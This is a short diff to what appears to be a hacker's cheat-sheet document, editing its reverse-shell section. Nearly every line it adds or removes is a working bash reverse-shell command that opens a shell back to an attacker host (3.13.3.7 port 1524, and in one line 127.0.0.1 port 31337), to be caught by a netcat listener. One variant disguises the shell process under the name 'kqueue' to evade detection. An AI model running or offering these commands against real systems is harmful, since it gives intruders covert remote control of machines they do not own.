@@ -912,11 +912,12 @@ nc -nvlp 1524
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
-setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
-# If the current shell is NOT bash then we need:
-bash -c 'setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
+# The the current shell is Bash already:
+(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
+# If the current shell is NOT Bash then we need:
+bash -c '(exec bash -i &>/dev/tcp/127.0.0.1/31337 0>&1) &'
 # or hide the bash process as 'kqueue'
-setsid bash -c 'exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
+bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
 
 <a id="reverse-shell-no-bash"></a>
